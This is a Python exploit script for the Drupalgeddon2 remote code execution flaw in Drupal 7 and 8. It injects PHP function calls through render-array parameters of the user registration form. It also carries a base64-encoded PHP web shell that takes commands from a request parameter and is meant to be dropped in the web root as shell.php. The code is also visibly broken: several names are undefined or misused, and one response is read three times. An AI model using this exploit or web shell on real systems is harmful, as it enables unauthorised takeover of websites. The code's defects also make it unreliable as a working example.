import base64
import json
import http.client
import urllib.parse
import ssl
import sys

# Settings - Try to write a PHP to the web root?
try_phpshell = True
# Settings - General/Stealth
useragent = "drupalgeddon2"
webshell = "shell.php"
# Settings - Proxy information (None to disable)
proxy_addr = None
proxy_port = 8080

# Settings - Payload (we could just be happy without this PHP shell, by using just the OS shell - but this is 'better'!)
bashcmd = "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }"
bashcmd = "echo " + base64.b64encode(bashcmd.encode()).decode() + " | base64 -d"


# Function http_request(url, type='get', data='', cookie='')
def http_request(url, type='get', data='', cookie=''):
    print(verbose("HTTP - URL : {}".format(url)))
    print(verbose("HTTP - Type: {}".format(type)))
    print(verbose("HTTP - Data: {}".format(data)) if data and verbose else '')
  
    conn = None
    if proxy_addr:
        conn = http.client.HTTPSConnection(proxy_addr, proxy_port, context=ssl._create_unverified_context())
    else:
        conn = http.client.HTTPSConnection(url)

    headers = {
        'User-Agent': useragent,
        'Cookie': cookie
    }

    try:
        conn.request(type.upper(), url, data, headers)
        response = conn.getresponse()
        return response
    except http.client.HTTPException as e:
        print(error("HTTP Exception: {}".format(e)))
    except ConnectionError as e:
        print(error("Connection Error: {}".format(e)))
    except ssl.SSLError as e:
        print(error("SSL Error: {}".format(e)))
    except socket.error as e:
        print(error("Socket Error: {}".format(e)))
    finally:
        if conn:
            conn.close()

    # If we got here, something went wrong.
    sys.exit()


# Function gen_evil_url(cmd, method='', shell=False, phpfunction='passthru')
def gen_evil_url(evil, element='', shell=False, phpfunction='passthru'):
    print(info("Payload: {}".format(evil)) if not shell else '')
    print(verbose("Element    : {}".format(element)) if not shell and element and verbose else '')
    print(verbose("PHP fn     : {}".format(phpfunction)) if not shell and verbose else '')

    # Vulnerable parameters: #access_callback / #lazy_builder / #pre_render / #post_render
    # Check the version to match the payload
    if drupal_version.startswith("8") and element == "mail":
        # Method #1 - Drupal v8.x: mail, #post_render - HTTP 200
        url = target + clean_url + form + "?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
        payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpfunction + "&mail[a][#type]=markup&mail[a][#markup]=" + evil

    elif drupal_version.startswith("8") and element == "timezone":
        # Method #2 - Drupal v8.x: timezone, #lazy_builder - HTTP 500 if phpfunction=exec // HTTP 200 if phpfunction=passthru
        url = target + clean_url + form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
        payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=" + phpfunction + "&timezone[a][#lazy_builder][][]=" + evil

    elif drupal_version.startswith("7") and element == "timezone":
        # Method #3 - Drupal v7.x: timezone, #pre_render - HTTP 200
        url = target + clean_url + form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
        payload = "form_build_id=&form_id=user_register_form&_drupal_ajax=1&timezone[a][#markup]=" + evil + "&timezone[a][#type]=markup"

    else:
        print(error("Could not determine the appropriate vulnerability method for this Drupal version and element."))
        sys.exit()

    return url, payload


# Function decode_payload(response, shell=False)
def decode_payload(response, shell=False):
    payload = response.read().decode()
    print(info("Payload response: {}".format(payload.strip())) if payload.strip() else info("Payload response: <empty>"))

    if shell:
        output = base64.b64decode(payload.strip()).decode()
        print(verbose("Shell output: {}".format(output.strip())) if output.strip() else verbose("Shell output: <empty>"))
        return output
    else:
        return payload.strip()


# Function exploit()
def exploit():
    print(info("Checking if target is vulnerable to Drupalgeddon2..."))

    # Step 1 - Test if the target is vulnerable
    response = http_request(target + clean_url + "?q=user%2Fregister&element_parents=account%2Fmail%2F%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                            type='post', data='form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=phpinfo&_=1')

    if response.status == 200 and "X-Drupal-Ajax-Token" in response.getheaders():
        print(success("Target is vulnerable to Drupalgeddon2!"))
    else:
        print(error("Target is not vulnerable to Drupalgeddon2. Exiting."))
        sys.exit()

    # Step 2 - Get Drupal version
    response = http_request(target + clean_url + "?q=admin/modules", cookie=response.getheader('Set-Cookie'))
    version_start = response.read().decode().find("<strong>Version</strong></td>\n      <td>")
    version_end = response.read().decode().find("</td>", version_start)
    version = response.read().decode()[version_start + 34:version_end]

    print(info("Drupal version: {}".format(version)))
    return version


# Main execution
if __name__ == "__main__":
    # Input validation
    if len(sys.argv) != 2:
        print("Usage: python3 drupalgeddon2.py <target URL>")
        sys.exit()

    # Variables
    target = sys.argv[1]
    clean_url = ""
    verbose = False
    info = "[*] "
    success = "[+] "
    error = "[-] "

    # Get the clean URL
    if target.endswith('/'):
        clean_url = target
    else:
        clean_url = target + '/'

    # Enable verbose mode
    if verbose:
        print(success("Verbose mode enabled"))

    # Exploit
    drupal_version = exploit()

    # Payload generation
    url, payload = gen_evil_url(bashcmd, element='mail', shell=try_phpshell)

    # Send the payload
    response = http_request(url, type='post', data=payload, cookie=response.getheader('Set-Cookie'))

    # Decode and print the payload response
    decode_payload(response, shell=try_phpshell)
